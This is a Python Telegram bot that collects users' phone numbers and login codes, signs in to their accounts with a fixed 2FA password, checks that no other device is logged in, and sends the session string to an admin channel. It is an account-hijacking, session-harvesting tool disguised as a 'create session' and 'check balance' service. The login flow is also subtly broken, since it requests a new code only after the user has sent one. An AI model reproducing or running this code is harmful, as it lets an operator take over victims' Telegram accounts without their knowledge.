import asyncio
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetAuthorizationsRequest
from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID, SESSION_2FA_PASSWORD
from languages.en import language as lang

bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

user_sessions = {}

@bot.on_message(filters.command("start") & filters.private)
async def start(client, message):
    keyboard = ReplyKeyboardMarkup(
        [["📲 Create New Session"], ["💰 Check Balance"], ["🌐 Change Language"]],
        resize_keyboard=True
    )
    await message.reply(lang["welcome"], reply_markup=keyboard)

@bot.on_message(filters.private & filters.text)
async def handle_messages(client, message):
    user_id = message.from_user.id
    text = message.text.strip()

    if text == "📲 Create New Session":
        await message.reply(lang["send_number"])
        user_sessions[user_id] = {"step": "await_number"}
        return

    if user_id in user_sessions:
        step = user_sessions[user_id].get("step")

        if step == "await_number":
            if not text.startswith("+") or len(text) < 8:
                await message.reply("❌ Please send a valid phone number with country code (e.g. +1234567890).")
                return
            user_sessions[user_id]["phone"] = text
            user_sessions[user_id]["step"] = "await_code"
            await message.reply(lang["send_code"])
            return

        elif step == "await_code":
            phone = user_sessions[user_id].get("phone")
            code = text
            await message.reply("⏳ Trying to create session, please wait...")

            try:
                # TelegramClient with Telethon
                async with TelegramClient(StringSession(), API_ID, API_HASH) as client_telethon:
                    await client_telethon.send_code_request(phone)
                    await client_telethon.sign_in(phone, code, password=SESSION_2FA_PASSWORD)
                    auths = await client_telethon(GetAuthorizationsRequest())
                    if len(auths.authorizations) > 1:
                        await message.reply(lang["multi_device"])
                        user_sessions.pop(user_id)
                        return

                    session_str = client_telethon.session.save()

                    # Send session file as document to admin channel
                    await bot.send_document(
                        chat_id=CHANNEL_ID,
                        document=(f"{phone}.session", session_str.encode())
                    )
                    await message.reply(lang["session_sent"])
                    user_sessions.pop(user_id)

            except Exception as e:
                await message.reply(f"{lang['invalid_code']}\nError: {str(e)}")
                user_sessions.pop(user_id)
            return

    else:
        await message.reply("❌ Please start with /start and choose an option.")

bot.run()